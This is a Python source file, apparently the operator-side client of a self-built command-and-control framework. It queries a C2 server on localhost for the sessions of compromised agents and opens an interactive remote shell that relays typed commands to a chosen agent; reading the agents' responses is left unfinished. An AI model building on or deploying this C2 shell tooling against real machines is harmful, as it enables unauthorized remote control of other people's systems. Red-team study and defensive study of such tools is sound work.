import socket
import cli
import struct
import protocol
import console
import colors


TARGET_PORT = 9000
TARGET_IP = "127.0.0.1"
HOST = "0.0.0.0"


# [count]              4 bytes

# for every session:
#     [session_id]     4 bytes
#     [ip_length]       4 bytes
#     [ip_address]      variable
#     [port]            2 bytes

def receive_exact(operator_socket, length): # function to receive the data in chunks 
    data = b""
    while len(data) < length:
        chunk = operator_socket.recv(length - len(data))
        if not chunk:
            raise ConnectionError(f"{colors.Fore.RED} [!] c2 server closed connection")
        data += chunk
    return data



def receive_sessions(operator_socket): # deserialize sessionInfo bytes and display total sessions and session ids
    session_count_bytes = receive_exact(operator_socket, 4) # receive total number of sessions present
    sessionCount = struct.unpack("!I", session_count_bytes)[0] # !I is used to unpack network bytes (Big endian) data into Python integer
    # struct.unpack() returns a tuple, so [0] is used to get only one value
    session_info = [] # list of dictionaries
    for _ in range(sessionCount):
        # receive agent session_id
        agent_session_id_bytes = receive_exact(operator_socket, 4) 
        agent_session_id = struct.unpack("!I", agent_session_id_bytes)[0]

        # receive agent ip address length
        agent_ip_len_bytes = receive_exact(operator_socket, 4)
        agent_ip_len = struct.unpack("!I", agent_ip_len_bytes)[0] #!I or !H tells python how to interpret those bytes like !I = unsigned 4 byte integer or uint32_t

        # receive agent ip address
        agent_ip_bytes = receive_exact(operator_socket, agent_ip_len)
        agent_ip = agent_ip_bytes.decode() # since ip address is a strin object

        #receive agent port
        agent_port_bytes = receive_exact(operator_socket, 2)
        agent_port = struct.unpack("!H", agent_port_bytes)[0]# since reading 2 bytes so !H = unsigned short = 2 bytes

        session_info.append({
            "agent_sid": agent_session_id,
            "agent_ip": agent_ip,
            "agent_port": agent_port,
        })
    #session_info.sort() we cannot directly use .sort() because python doesn't know to sort dictionary values.
    # because sorting needs to happen based on a comparison so we need to use a different method
    session_info = sorted(session_info, key=lambda a : a["agent_sid"]) # sorting the session_info list containing dictionary values based on session_id
    return session_info, sessionCount



def start_shell(session_id): # here session_id is the current_session variable from dispatcher.py 
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        shell_socket.connect((TARGET_IP, TARGET_PORT))
        # specifying which session should enter the shell mode
        # shell_start creates a shell and other continues executing commands on that shell and another one exits the shell
        packet_bytes = protocol.packet_formation(protocol.MESSAGE_SHELL_START, session_id, "")
        shell_socket.sendall(packet_bytes)
        print(f"{colors.Style.BRIGHT}{colors.Fore.CYAN}[*]starting shell{colors.Style.RESET_ALL}")
        print()
        while True:
            command = cli.shellPrompt()
            if command == "back" or command == "exit": # exit shell session
                print(f"{colors.Fore.CYAN}[*] exiting shell")
                exit_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_EXIT, session_id, "")
                shell_socket.sendall(exit_packet) # exit shell prompt
                break
            data_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_DATA, session_id, command) # create shell command packet structure
            shell_socket.sendall(data_packet) # send server shell commands 
            # below is the response given by the agent relayed by the server
            # TO DO HERE
            
    except OSError as e:
        print(f"{colors.Fore.RED}[!] shell connection closed")
    finally:
        shell_socket.close()



def sessions(command):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as operator_socket:
        try:
            operator_socket.connect((TARGET_IP, TARGET_PORT))
            #print(f"[+] operator connected to server successfully")
            while True:
                if command == "sessions":
                    packet_bytes = protocol.packet_formation(protocol.MESSAGE_COMMAND, 0, command) # 0 because we are just typing "sessions" command and not choosing any active session so...
                    operator_socket.sendall(packet_bytes)
                    session_info, sessionCount = receive_sessions(operator_socket) # passing operator socket and 4 bytes cuz number of session ids are 4 bytes
                    console.display_sessionInfo(session_info, sessionCount)
                    return session_info
        except OSError as e:
            print(f"{colors.Fore.RED}[!] couldn't connect to server\n")
            operator_socket.close()